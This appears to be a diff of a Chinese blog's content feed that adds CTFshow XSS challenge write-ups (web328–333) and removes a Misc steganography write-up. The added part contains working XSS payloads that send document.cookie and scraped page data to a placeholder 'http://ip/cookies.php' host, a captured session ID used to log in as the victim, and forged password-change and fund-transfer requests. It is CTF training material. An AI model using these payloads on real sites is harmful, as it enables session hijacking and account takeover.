@@ -73,6 +73,58 @@
 
 <p><img src="/2022/CTFshowXSS/image-20220326205515255.png" alt="image-20220326205515255"></p>
 <p>ctfshow{32567b43-cf11-42d1-ba53-0c2336663199}</p>
+<h1 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h1><p>先注册一个用户</p>
+<p><img src="/2022/CTFshowXSS/image-20220328125812495.png" alt="image-20220328125812495"></p>
+<p>密码写我们准备好的payload</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;body<span class="comment">/**/</span>onload=<span class="string">&quot;window.location.href=&#x27;http://ip/cookies.php?1=&#x27;+document.cookie&quot;</span>&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我使用Body标签不行，那就换回最初的</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://ip/cookies.php?1=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到了一个sessid，利用它伪造登录</p>
+<p>我使用了插件<code>EditThisCookie</code>，也可以使用Burp抓包</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHPSESSID=bec8bn2qqso9i9n8ka5fmq428n</span><br></pre></td></tr></table></figure>
+
+<p>登录成功就可以看flag</p>
+<p><img src="/2022/CTFshowXSS/image-20220328130850864.png" alt="image-20220328130850864"></p>
+<p>ctfshow{743334a7-6d24-45ff-b0cf-2f41e5a887b4}</p>
+<h1 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h1><ul>
+<li><p>js遍历密码输出含有<code>ctfshow&#123;</code>的密码字符串</p>
+</li>
+<li><p>pay</p>
+</li>
+<li><p>&#96;&#96;&#96;javascript</p>
+<script>$('.laytable-cell-1-0-1').each(function(index, value){if(value.innerHTML.indexOf('ctf'+'show'+'{')>-1){window.location.href='http://ip/cookies.php?1='+value.innerHTML;}});</script>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">得到ctfshow&#123;7ed51646-3092-49d4-aa2f-01a32ef1ee18&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># web330</span><br><span class="line"></span><br><span class="line">![image-20220328151201483](CTFshowXSS/image-20220328151201483.png)</span><br><span class="line"></span><br><span class="line">多给了修改密码。</span><br><span class="line"></span><br><span class="line">我们通过抓包可以知道修改密码的路径，对面管理员在本地，就利用构造恶意链接。跳转成功修改密码</span><br><span class="line"></span><br><span class="line">![image-20220328151422658](CTFshowXSS/image-20220328151422658.png)</span><br><span class="line"></span><br><span class="line">pay</span><br><span class="line"></span><br><span class="line">```javascript</span><br><span class="line">&lt;script&gt;window.location.href=&#x27;http://127.0.0.1/api/change.php?p=123&#x27;;&lt;/script&gt;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>注册账号，在用户那栏插入pay，等待后就可以登录了。</p>
+<p><img src="/2022/CTFshowXSS/image-20220328152135319.png" alt="image-20220328152135319"></p>
+<p>ctfshow{7767e6bc-4934-4ca9-9ce5-80ba81d27282}</p>
+<h1 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h1><p>界面没有改变，但是改成post请求了</p>
+<p><img src="/2022/CTFshowXSS/image-20220328152407849.png" alt="image-20220328152407849"></p>
+<p>将我们的pay改成post请求就可以了，可以在页面源码看</p>
+<p><img src="/2022/CTFshowXSS/image-20220328154253809.png" alt="image-20220328154253809"></p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;$.<span class="title function_">ajax</span>(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/change.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">p</span>:<span class="string">&#x27;123&#x27;</span>&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>用户管理就得到flag</p>
+<p><img src="/2022/CTFshowXSS/image-20220328155421007.png" alt="image-20220328155421007"></p>
+<p>ctfshow{8c289986-2ced-4df4-8b8c-e17c731a4f07}</p>
+<h1 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h1><p><img src="/2022/CTFshowXSS/image-20220328160551062.png" alt="image-20220328160551062"></p>
+<p>要给钱了</p>
+<p>flag要9999</p>
+<ul>
+<li>转账汇款处<code>-10000</code></li>
+<li>购买<code>flag</code></li>
+</ul>
+<h1 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h1><h2 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h2><ul>
+<li>自己给自己转账,只要自己的转账金额不超过余额。有上限，别超过了，超过就是为1。</li>
+</ul>
+<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>注册账户</p>
+<p>先给管理员转1元，获取路径</p>
+<p><img src="/2022/CTFshowXSS/image-20220328191759597.png" alt="image-20220328191759597"></p>
+<p>构造pay</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;$.<span class="title function_">ajax</span>(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/amount.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;u=<span class="string">&#x27;123&#x27;</span>,<span class="attr">a</span>:<span class="string">&#x27;10000&#x27;</span>&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>Web渗透</category>
@@ -83,173 +135,48 @@
       </tags>
   </entry>
   <entry>
-    <title>Misc小合集（一）</title>
-    <url>/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记一次杂项小训练</p>
-<p><strong>Misc 1</strong> - <strong>Misc 10</strong></p>
+    <title>win10内网穿透</title>
+    <url>/2022/win10%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是我在探索服务器路上的一次记录，为了就是先去了解服务器。方便自己尝试，这篇文章也是参考许多大佬的文章。希望可以给你提供一点帮助。</p>
 <span id="more"></span>
 
-<h1 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc 1"></a>Misc 1</h1><p>[ACTF新生赛2020]frequency</p>
-<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul>
-<li>strings</li>
-<li>word隐藏文字</li>
-<li>字频统计</li>
+<h1 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h1><ul>
+<li>Windows镜像</li>
+<li>VM16虚拟机</li>
+<li>花生壳8</li>
+<li>宝塔</li>
 </ul>
-<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>首先用string命令查看文件，得到两段可疑代码</p>
-<p>使用下面的一段，看起来像base64码</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220312124955095.png"></p>
-<p>在Word里面，显示隐藏文字和解除隐藏。文字无法复制，但是我发现可以通过剪切出。</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220312125607111.png"></p>
-<p>也可以通过解除隐藏复制</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220312125914279.png"></p>
-<p>将它们组合起来</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a2draGxmY290bnRpdWZwZ2hodGN3dWprY2ttb3ducGNrbXdseWd0bHBtZmtneWFhaWh1Y2RsYXRveXVjb2lnZ3JwbGt2a2Ftcmt0cXp4ZW1taXdrbGh1YWVrY2VvbHBvY2ZtdGFobWdmbWF2YWpuYmNwbWx0anRwdWZqY2FwY3RvanBqYmZmYmpid2h1YWxnZ3lqbmFtY2JmeWFjamJheGtpeGxtbXFpa3NtcHRxeW9qZXJ0ZmVrdGR4ZHh4YnRyeGNhbmd5bXNpbWh2dXdrdGV4c2dscnRwZ2FrdGJtZnVjZ3ZubXRqdWZvZWt5bXRsaW14ZGlqanB4eWl0YWJwbWt1Y2NubGtwb2V0Z2NkY3Bvc2tpenZ5eHJ0enhyYXh0bm9paHFjeGZvYWFhbHBhanlja2VrYnljZnZqb21sbGthamd5bWdmZGNycGVxa2xmc2NtZWppY3BqaWtjcHBhY3h5ZXZma3ljcHBia2R6Y2ZsbGlrcW5pdGNrYmhqb3JuZGhzb21mdHlwYWhwcW94cnlpbWhmbGNoY21rb3JldG1yb3RrYXJjanRobWZ0aWxpam55a3V0aWhienR0dW1zbmdmdGxtcmJmZmx0ZndjbmptZmF0bGZiemxva3RscHBsbWZpY29rcHBucGFjbWZ1Z21wdW5kdnRvbXdldmNqc2dhamdmZXF1dXBhaWV0eW5mamJicGpzbHZ5bmFmdG1scHBka3R0b2Z1emppanhpdGJmaXJtb3ZwemVraXJic2Zqc2d6bHVrb2x5dm9obXZnY3BrdGhzeGZ6bW1ibm1sZHp5dWljZHZrbXpiYXlidG9yY2ZvdHRkYW1jY25iYXBucmd4bGN5cGh5Zm5jZXhidmRubG9rZ295aWxwcmxvbnNodGNranR4bmFiamhsbWJwZGNtaGtqbmxnbXRnam5qYWtyaXpsbHBtbWFscHhhbXVuaW51cGtwZGlhcHNzbXZrZGp2Z2l5b2R1bXBuYXBsamtqYmNmaHRoc2tpb2twZ3R0eWhubmRzeGtxanp2dmRvc2VwcG9pZ3l0bW5uYXZjdG9wZHlpeHZiZG9zb2JtY3ViaXVhanhoeWZrdnJremdjdXlpbHB2YXdheW5xYWFwbGJrd2lpeHJjdGN0bGt4ZmpscGVhbW1qbmF1amNvdWlmbXZpa2ZpbXJvYXF0Y3RjZm1hdWJnYWdva2FyZnFmaGVtb3NydHlmb3B1a3VkY2FhaW1oZGZvZ25oa3JjZWxwY2F0Y3RweWpsYXZva2xnY2xhdGx0bXR6eWdwZWhma3poY3R6bmdtb2ZjaXpsdm54dG5sdWFqbHRvdmNqYWp1YnphdHBlaGhma25uZ2dwbHlsaXZmZWFpZHJteWp0YWNhbXhjbmtmeXN0d2ZuZmx5bmJta2NrYXJ4YWlzcGpsa3ZjdHZrbHh1bmNmcGJ4dmlyaXFleXBtdXZ1bHZsamNrY3lwcHRwdmV0b3hobWlwYmlsbmplb3drd3VjdG9rbmFmcHdvYXBmdGNsemhwaHhjY2F0dGh1bXZ3aHpvbWFmd3Fxbmxzb3lhYnV0bHpwaWF0Zm1tYWprcmR2bGN6d2pwc3Nwb2FiaWZpcGhrb2NocHRrYXRrYWZlb255YmZpdmVjbGR6b2ZhdGV0Z2FsaGFmYW1vYXlvc291bm5hZmlhdGNqdGl3b29sYWNya2N1YWRwdXRreWxweXBiZ2ZlcHdwc25jd2tjd2xsYXJ5anNjYW5id3BkcHpicHR1dG5sbm9wd3BpdGJsb3RsbHppZmtsYWF1cmpwaWFqZnB0a2ZteHBic3VjdmpzZ21jYWxhbnRyc2NrYmt1eWZnYWFrZmFjbmxkdXZxZXR5amdqbW5hZWFjbmdheGNuYW1qbWlna2tpdW1sbmR3Y2ttdWFuYW52cnJiZnp4enl1dWVob25lbWxjanp1dm9hanVmZGdqampjZ21ucHRmdXVjdWJjdGpoYW1sb2xmaG9pZnZia2themNwb3pjeXVjYnJnb2picG5haGNneXV0dGR2bXR0dndqbWhic2ptYmJhdmNkbHlob3Fqb21wY3B2aHRrb2FpcnZ0bWtmZnlhdGttcHR1dW9vb2xncG5udWVsaGZodnZpc3Vrd3lubWlhY25sbHVtaHRqZWt1YXV1cGxyeGtpZXB1anhsaWNma2NiY2htbmdsZ3BsaWhteWNybnNvbWF3dWZ1b29tdXVuaGRvb2FydWRhbW9hbW9ocW9vY2Z1cGp1aWFieHh1dnl2bm9zb3Vvb3Zha2xjZmt0eXJmYWdmYXl2cHVmdnBiZ3RhZmVraXBpY292dGZ0bnV4c2phdmpkcWt2ZnVpa2x0bWRrYmJua3BhZnhycXBmZ2N0dmFzY3VqamN1Y2h1YXpjaXVtdHRkbmF3aWhtbW9qZmJoeHZvbXRmcGJmaHR2aXdsYXVlb2dwcG1qc3BjYWxmaGNhcmtsYmlzcGh0anBhbmhsaXNwbnRza2tjbGpnZ2tjenRmaG5lY25wdGlmZnRyZG10amZla2ZpdGthc2RnbmVscHVoYmZpbXB1Y2JrcGtjbXhsZmtwaWlqdmh0amtzeWx6cm9vZmFjeGNscGpuaGJpcmN5ZGp0Y2xqZG9ibHlyeW1hdGdoaWZvam1qanNla29vbW9mY2FjdGF2ZmN5Zm11Znhoc3Rqd3VwYmpreW9nbnlyeXBseXBxbGF5eW1veHRhbnFkcHVyYnd6cGxsb2traGhtYW5kam5hdGNibGtjb3Rna2x1dHR3YmRhdHFybWF6cHJ2YXd6anhlZmhqdGRraWt1cmxsY2xjam9naG1sd3RhbWRkY2NucXVyb3Jha2N5b2JsYXJ6YWNtbnFjbWV0dHVheWF1eWl2c21ma25uYW5sdGNtaWdmcmdhYmlwdG50aG1tdXRwaWJ5bHJhdGhqY2doY2ZtbG92cGNudHFwZW96bG90ZGtlaW9jZmtjaXZ1eWx6Ympvb3hjc2FjbmdkdXZ4dG50aGphZXBhdX1rbGFocGNtdnppY2twYWFwaG9jZ2lvZ2p0dnB0Z2poZG9udW5scGFvbG5kcWJxZmRtYnBqam94Ym9tbGlreXVpcG54cXh6Y2lmb3JhaGhldXl5dHpoanV0Z2Z3dHVscmpjZnhvaWFneWpmYnBqaWFrZ3l0eGJmbnBsZnBxd3RkaXFuaXR2dmF1amRqbGlmamlvcnltdmZ4bXhnb3JpY3ljZGZob2ZiYnlnZmxhdGlyamRpZGFkcXZpa2pvY2l5ZmR6aHJvZ255eWlia2dubnZobWpsb2xhdndmaWpjZ2dma3B0a3BnY3FmYWZheXNpdHltYWN2a3FweWxoaGJ1Ymh4c2x1emN5dmxvcmlwdGxwZmxjdWljcG5mc2hpeXh2a2tiY2p5dWtvdGFsZmNpcGhjZGd4aWZ0a2xkZ29wanNtdXJ0eWp5cGhia2JmbmJ3YnNvZmlheHRsdWhwbXJmZGFrdWx1cGVhcHZyeXhtYWVwaGF5bmV4emZsbmV2am1pYndvcml0aGh4YmJ5cG1tYWJvYmZuZmNvanR0Y3Jram1naXJ2bWlzdW5mbHVodGVudHJodGVvamtjaGtwZnBhZXNnd2dscWRrdnZudWx1bnF7bG1sdGFscGhvdWZqcGlhbGNmbGZ5ZHZmd3lkb2ZraGFpeWF3bGx3Y2pvYXJxdnpqbGZmZ2xjdGNsYmxwa2JzZmxocnRqZGFvd3ByZGJjdWJmbHlveWJodmh3ZndvZWl0Z254YnpuaWZwbGx4bXN0a251aWhvYmZlZWZra2FreW5uYWNra2NkdWFtZ3N2bnBoY3RmZ3NybnJvZWh2ZW5kYmZpb21xZm14Ym1paWl1bGF2b2dma2dhY2lrYWFtcHBybGpmbXBqY3VhYXNja2l1cWlmY2liamx1dGNtcGF0b2pyanZmeGdsenBvcGpkZ2NoanVqbGtuZnd0cG5qZnBhY3JrcHRmaGNzamdyaXBjcmZjZGFsem5ob25mZGNvaG9zZmhvaGVha250aXRtamZsbmJvcGNsY3hjdWlnb3hja3JiYWxyYWVidGFhcml0ZWZtemNxaWRvZmd0ZnFnYmFkaWNubWhvdGlvbm9iZnlubGdvenRkYXZ2aW14b2JvdGlra2Z4d2lyb3JwZmNjdXpob3BoZmRjaWVrY2p5b21lamtjZ2Zmam51bmhvcGFkdGZndG1sdA==</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>进行base64解码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kgkhlfcotntiufpghhtcwujkckmownpckmwlygtlpmfkgyaaihucdlatoyucoiggrplkvkamrktqzxemmiwklhuaekceolpocfmtahmgfmavajnbcpmltjtpufjcapctojpjbffbjbwhualggyjnamcbfyacjbaxkixlmmqiksmptqyojertfektdxdxxbtrxcangymsimhvuwktexsglrtpgaktbmfucgvnmtjufoekymtlimxdijjpxyitabpmkuccnlkpoetgcdcposkizvyxrtzxraxtnoihqcxfoaaalpajyckekbycfvjomllkajgymgfdcrpeqklfscmejicpjikcppacxyevfkycppbkdzcfllikqnitckbhjorndhsomftypahpqoxryimhflchcmkoretmrotkarcjthmftilijnykutihbzttumsngftlmrbffltfwcnjmfatlfbzloktlpplmficokppnpacmfugmpundvtomwevcjsgajgfequupaietynfjbbpjslvynaftmlppdkttofuzjijxitbfirmovpzekirbsfjsgzlukolyvohmvgcpkthsxfzmmbnmldzyuicdvkmzbaybtorcfottdamccnbapnrgxlcyphyfncexbvdnlokgoyilprlonshtckjtxnabjhlmbpdcmhkjnlgmtgjnjakrizllpmmalpxamuninupkpdiapssmvkdjvgiyodumpnapljkjbcfhthskiokpgttyhnndsxkqjzvvdoseppoigytmnnavctopdyixvbdosobmcubiuajxhyfkvrkzgcuyilpvawaynqaaplbkwiixrctctlkxfjlpeammjnaujcouifmvikfimroaqtctcfmaubgagokarfqfhemosrtyfopukudcaaimhdfognhkrcelpcatctpyjlavoklgclatltmtzygpehfkzhctzngmofcizlvnxtnluajltovcjajubzatpehhfknnggplylivfeaidrmyjtacamxcnkfystwfnflynbmkckarxaispjlkvctvklxuncfpbxviriqeypmuvulvljckcypptpvetoxhmipbilnjeowkwuctoknafpwoapftclzhphxccatthumvwhzomafwqqnlsoyabutlzpiatfmmajkrdvlczwjpsspoabifiphkochptkatkafeonybfivecldzofatetgalhafamoayosounnafiatcjtiwoolacrkcuadputkylpypbgfepwpsncwkcwllaryjscanbwpdpzbptutnlnopwpitblotllzifklaaurjpiajfptkfmxpbsucvjsgmcalantrsckbkuyfgaakfacnlduvqetyjgjmnaeacngaxcnamjmigkkiumlndwckmuananvrrbfzxzyuuehonemlcjzuvoajufdgjjjcgmnptfuucubctjhamlolfhoifvbkkazcpozcyucbrgojbpnahcgyuttdvmttvwjmhbsjmbbavcdlyhoqjompcpvhtkoairvtmkffyatkmptuuooolgpnnuelhfhvvisukwynmiacnllumhtjekuauuplrxkiepujxlicfkcbchmnglgplihmycrnsomawufuoomuunhdooarudamoamohqoocfupjuiabxxuvyvnosouoovaklcfktyrfagfayvpufvpbgtafekipicovtftnuxsjavjdqkvfuikltmdkbbnkpafxrqpfgctvascujjcuchuazciumttdnawihmmojfbhxvomtfpbfhtviwlaueogppmjspcalfhcarklbisphtjpanhlispntskkcljggkcztfhnecnptifftrdmtjfekfitkasdgnelpuhbfimpucbkpkcmxlfkpiijvhtjksylzroofacxclpjnhbircydjtcljdoblyrymatghifojmjjsekoomofcactavfcyfmufxhstjwupbjkyognyryplypqlayymoxtanqdpurbwzpllokkhhmandjnatcblkcotgkluttwbdatqrmazprvawzjxefhjtdkikurllclcjoghmlwtamddccnqurorakcyoblarzacmnqcmettuayauyivsmfknnanltcmigfrgabiptnthmmutpibylrathjcghcfmlovpcntqpeozlotdkeiocfkcivuylzbjooxcsacngduvxtnthjaepau&#125;klahpcmvzickpaaphocgiogjtvptgjhdonunlpaolndqbqfdmbpjjoxbomlikyuipnxqxzciforahheuyytzhjutgfwtulrjcfxoiagyjfbpjiakgytxbfnplfpqwtdiqnitvvaujdjlifjiorymvfxmxgoricycdfhofbbygflatirjdidadqvikjociyfdzhrognyyibkgnnvhmjlolavwfijcggfkptkpgcqfafaysitymacvkqpylhhbubhxsluzcyvloriptlpflcuicpnfshiyxvkkbcjyukotalfciphcdgxiftkldgopjsmurtyjyphbkbfnbwbsofiaxtluhpmrfdakulupeapvryxmaephaynexzflnevjmibworithhxbbypmmabobfnfcojttcrkjmgirvmisunfluhtentrhteojkchkpfpaesgwglqdkvvnulunq&#123;lmltalphoufjpialcflfydvfwydofkhaiyawllwcjoarqvzjlffglctclblpkbsflhrtjdaowprdbcubflyoybhvhwfwoeitgnxbznifpllxmstknuihobfeefkkakynnackkcduamgsvnphctfgsrnroehvendbfiomqfmxbmiiiulavogfkgacikaampprljfmpjcuaasckiuqifcibjlutcmpatojrjvfxglzpopjdgchjujlknfwtpnjfpacrkptfhcsjgripcrfcdalznhonfdcohosfhoheakntitmjflnbopclcxcuigoxckrbalraebtaaritefmzcqidofgtfqgbadicnmhotionobfynlgoztdavvimxobotikkfxwirorpfccuzhophfdciekcjyomejkcgffjnunhopadtfgtmlt</span><br></pre></td></tr></table></figure>
-
-<p>frequency有频率的意思，猜测是字频统计</p>
-<p>借用大佬脚本</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment">#用来统计TXT文本，并统计字频</span></span><br><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">fr = <span class="built_in">open</span>(<span class="string">r&#x27;C:/Users/zxy13/Desktop/1.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"><span class="comment"># 读取文件所有行</span></span><br><span class="line">content = fr.readlines()</span><br><span class="line">contentLines = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">characers = []  <span class="comment"># 存放不同字的总数</span></span><br><span class="line">rate = &#123;&#125;  <span class="comment"># 存放每个字出现的频率</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 依次迭代所有行</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">    <span class="comment"># 去除空格</span></span><br><span class="line">    line = line.strip()</span><br><span class="line">    <span class="comment"># 如果是空行，则跳过</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(line) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    contentLines = contentLines + line</span><br><span class="line">    <span class="comment"># 统计每一字出现的个数</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(line)):</span><br><span class="line">        <span class="comment"># 如果字符第一次出现 加入到字符数组中</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line[x] <span class="keyword">in</span> characers:</span><br><span class="line">            characers.append(line[x])</span><br><span class="line">        <span class="comment"># 如果是字符第一次出现 加入到字典中</span></span><br><span class="line">        <span class="keyword">if</span> line[x] <span class="keyword">not</span> <span class="keyword">in</span> rate:</span><br><span class="line">            rate[line[x]] = <span class="number">1</span></span><br><span class="line">        <span class="comment"># 出现次数加一</span></span><br><span class="line">        rate[line[x]] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 对字典进行倒数排序 从高到低 其中e表示dict.items()中的一个元素，</span></span><br><span class="line"><span class="comment"># e[1]则表示按 值排序如果把e[1]改成e[0]，那么则是按键排序，</span></span><br><span class="line"><span class="comment"># reverse=False可以省略，默认为升序排列</span></span><br><span class="line">rate = <span class="built_in">sorted</span>(rate.items(), key=<span class="keyword">lambda</span> e: e[<span class="number">1</span>], reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;全文共有%d个字&#x27;</span> % <span class="built_in">len</span>(contentLines))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;一共有%d个不同的字&#x27;</span> % <span class="built_in">len</span>(characers))</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> rate:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[&quot;</span>, i[<span class="number">0</span>], <span class="string">&quot;] 共出现 &quot;</span>, i[<span class="number">1</span>], <span class="string">&quot;次&quot;</span>)</span><br><span class="line"></span><br><span class="line">fr.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>得到</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">actf&#123;plokmijnuhbygvrdxeszwq&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="Misc-2"><a href="#Misc-2" class="headerlink" title="Misc 2"></a>Misc 2</h1><p>[ACTF新生赛2020]outguess</p>
-<h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul>
-<li>outguess</li>
-<li>社会主义核心价值观编码</li>
-</ul>
-<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>在flag.txt中有，猜测是outguess隐写</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag在哪？</span><br><span class="line">你Guess一下啊！</span><br></pre></td></tr></table></figure>
-
-<p>在图片的属性中发现：<code>公正民主公正文明公正和谐</code></p>
-<p>解密出来是：<code>abc</code></p>
-<p>使用outguess隐写工具</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">outguess -r mmm.jpg -t 1.txt -k abc   </span><br></pre></td></tr></table></figure>
-
-<p>得到flag：<code>ACTF&#123;gue33_Gu3Ss!2020&#125;</code></p>
-<h1 id="Misc3"><a href="#Misc3" class="headerlink" title="Misc3"></a>Misc3</h1><p>[ACTF新生赛2020]NTFS数据流</p>
-<h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><ul>
-<li>NTFS隐写</li>
-</ul>
-<h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><p>注意：这里解压的时候使用Win RAR解压，涉及NTFS流的都需要Win RAR解压</p>
-<p>工具：Ntfsstreamseditor.exe</p>
-<p>使用工具就可以得到flag了。</p>
-<h1 id="Misc4"><a href="#Misc4" class="headerlink" title="Misc4"></a>Misc4</h1><p>[ACTF新生赛2020]music</p>
-<h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><ul>
-<li>音频隐写</li>
-<li>异或处理</li>
-</ul>
-<h2 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h2><p>音频没有办法打开，显示异常，用010查看</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313154611541.png"></p>
-<p>发现根本不符合格式</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313154714073.png"></p>
-<p>多次出行相同的字符，猜测是进行了异或，<code>工具-&gt;十六进制运算-&gt;二进制异或</code></p>
-<p>全文进行异或后得到正确文件</p>
-<p><img src="/2022/Misc%E5%90%88%E9%9B%86%E4%B8%80/image-20220313154858601.png"></p>
-<p>得到flag：<code>actfabcdfghijk</code></p>
-<h1 id="Misc5"><a href="#Misc5" class="headerlink" title="Misc5"></a>Misc5</h1><p>[ACTF新生赛2020]wget</p>
-<h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><ul>
-<li>流量分析</li>
-<li>zip伪加密</li>
-</ul>
-<h2 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h2><p>我通过binwalk命令查看到流量包中有存在压缩包，我利用命令分离文件，但是文件损坏</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">foremost -T wget.pcapng </span><br></pre></td></tr></table></figure>
-
-<p>我直接在wirshark中直接保存出得到压缩包，但是压缩包需要密码。利用ZipCenOp.jar修复zip压缩包。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar .\ZipCenOp.jar r .\1.zip</span><br></pre></td></tr></table></figure>
-
-<p>解开压缩包得到flag文件</p>
-<p>使用strings命令就可以输出flag：actf{c5558bcf-26da-4f8b-b181-b61f3850b9e5}</p>
-<h1 id="Misc6"><a href="#Misc6" class="headerlink" title="Misc6"></a>Misc6</h1><p>[ACTF新生赛2021]与熊论道</p>
-<h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h2><ul>
-<li>与熊论道编码</li>
-<li>社会主义核心价值观编码</li>
-<li>bmp图片隐写</li>
-</ul>
-<h2 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h2><p>猜测是和与禅论道一样的编码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">熊曰：呋食性咯怎很盜溫吖盜萌嚄眠嗥吖物和我嘿襲人現擊有嚁嘿襲嗡取果盜和吖非嗷咬和取象洞家食住捕咬嗅拙喜爾常拙捕咯會呦唬沒歡肉咬哞笨註氏破吃咯噤誘嗡唬樣取偶蜜嗒我咬咬嘶盜覺歡我嗡嗅哞麼你和嗄會取喜嗡咬歡象取襲</span><br></pre></td></tr></table></figure>
-
-<p><a href="http://hi.pcmoe.net/">与熊论道</a></p>
-<p>解得：<code>法治富强法治法治公正自由和谐诚信富强和谐民主和谐文明和谐和谐和谐自由和谐平等和谐公正</code></p>
-<p><a href="https://atool.vip/corevalue/">社会主义核心价值观编码</a></p>
-<p>解得：<code>pwd:123456</code></p>
-<p>密码是干嘛用的呢？</p>
-<p>有关bmp图片隐写，我找到两个工具wbStego4.3open和silenteye</p>
-<p>这题用wbStego4.3open就可以解密</p>
-<p><strong><code>ACTF&#123;PXY_wants_@_bOyfri3nd&#125;</code></strong></p>
-<h1 id="Misc7"><a href="#Misc7" class="headerlink" title="Misc7"></a>Misc7</h1><p>[ACTF新生赛2020]你看我匀称吗？</p>
-<h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h2><ul>
-<li>LSB隐写</li>
-<li>修改图片宽高</li>
-</ul>
